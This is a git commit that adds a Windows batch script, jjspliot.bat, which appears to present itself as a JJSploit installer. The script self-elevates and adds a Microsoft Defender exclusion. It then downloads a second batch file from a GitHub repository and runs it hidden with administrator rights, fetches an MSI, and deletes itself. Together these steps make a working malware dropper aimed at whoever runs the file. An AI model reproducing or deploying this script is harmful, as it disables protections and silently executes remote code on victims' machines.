0e526678f0b748f6f7d1599a82de57729c654ab4
Glareing <glareing@proton.me>
2025-05-01 18:04:04 +0100

    Create jjspliot.bat

---
+++ jjspliot.bat
@@ -0,0 +1,17 @@
+@echo off
+NET SESSION >nul 2>nul
+if %errorlevel% NEQ 0 (
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit
+)
+mkdir "%APPDATA%\Chrome"
+powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%\Chrome'"
+rmdir /s /q "%APPDATA%\Chrome"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/Glareing/Validation-check/raw/main/install.bat' -OutFile '%APPDATA%/install.bat'"
+powershell -Command "Start-Process '"%APPDATA%\install.bat' -WindowStyle Hidden -Verb RunAs"
+powershell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/Glareing/Validation-check/blob/main/jjsploit_8.14.1_x64_en-US.msi' -OutFile '%USERPROFILE%/Desktop'"
+if not exist "%APPDATA%\install.bat" (
+    timeout /t 2
+    powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; [System.Windows.Forms.MessageBox]::Show('Worked','Notification')"
+)
+(del "%~f0") & exit
